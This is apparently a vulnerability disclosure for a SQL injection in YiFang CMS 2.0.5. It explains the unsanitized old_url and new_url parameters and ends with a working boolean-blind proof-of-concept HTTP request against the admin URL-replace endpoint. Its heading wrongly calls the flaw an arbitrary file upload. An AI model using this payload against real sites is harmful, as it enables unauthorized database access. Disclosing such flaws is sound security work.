# Vendor

YiFang

# Product

YiFang CMS

# version

 2.0.5

# Download 

https://www.yifangcms.com

# Vulnerability

Yifang latest version 2.0.5 can be uploaded at any file

# Description

The content entered by the user is not filtered, causing the user to perform SQL injection by constructing malicious commands.

# Analysis
Cause of vulnerability 

1. Directly splice user input: $dataObj->request->old_url and $dataObj->request->new_url directly embed SQL statements
2. Lack of parameterization processing: preprocessing statements or escape special characters
3. Inadequate verification: Parameter verification (validatorRequest) only checks the existence of fields, and does not filter dangerous characters

<img width="1497" height="409" alt="image" src="https://github.com/user-attachments/assets/0a23706c-076d-476e-ab8d-bd48ab53ab2e" />

Use boolean blind to prove the vulnerability: 

Test found that the first digit of user() is r
<img width="1030" height="396" alt="image" src="https://github.com/user-attachments/assets/ce0199ba-ba2c-44fd-a583-eb056c3f26fd" />

<img width="1027" height="425" alt="image" src="https://github.com/user-attachments/assets/bf22cc3d-2a62-46ed-8ef4-9a3a9e20cb40" />


# POC
```
POST /admin/tool/replaceSiteUrl HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0
Cookie: cms_session=grq61ku3fmt3v3ll42dg028i66
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

old_url=http://localhost&new_url='%2b(SELECT+IF(SUBSTRING(USER(),1,1)='r','b',0x00))%2b'&
```
